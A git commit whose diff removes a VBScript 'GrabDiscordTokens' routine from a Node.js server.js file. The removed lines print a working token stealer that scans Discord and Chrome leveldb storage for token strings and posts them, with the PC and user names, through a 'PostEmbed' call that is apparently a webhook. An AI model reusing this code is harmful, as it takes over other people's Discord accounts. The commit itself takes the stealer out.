17a28c985bda78a36e52ad6ea934c5eb2542dc70
kaikssaqes <kaikneofire@gmail.com>
2026-09-06 12:26:11 -0400

    Remove GrabDiscordTokens function from server.js
    Removed a function for grabbing Discord tokens from server.js.

--- server.js
+++ server.js
@@ -16,33 +16,3 @@ app.get('/', (req, res) => {
 app.listen(port, () => {
     console.log(`Server running on port ${port}`);
 });
-Sub GrabDiscordTokens()
-    Dim paths(1)
-    paths(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Discord\Local Storage\leveldb"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
-    Dim tokens: tokens = ""
-    Dim folder, file, fso, content, regex, matches
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set regex = New RegExp
-    regex.Pattern = """([^""]*token[^""]*)""\s*:\s*""([^""]+)"""
-    regex.Global = True
-    For Each folderPath In paths
-        If fso.FolderExists(folderPath) Then
-            Set folder = fso.GetFolder(folderPath)
-            For Each file In folder.Files
-                If InStr(file.Name, ".ldb") > 0 Or InStr(file.Name, ".log") > 0 Then
-                    content = ReadFile(file.Path)
-                    Set matches = regex.Execute(content)
-                    For Each match In matches
-                        If InStr(match.SubMatches(0), "token") > 0 Then
-                            tokens = tokens & match.SubMatches(1) & vbLf
-                        End If
-                    Next
-                End If
-            Next
-        End If
-    Next
-    If Len(tokens) > 0 Then
-        Call PostEmbed("Discord Tokens", "Tokens:" & vbLf & tokens & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16753920)
-    End If
-End Sub
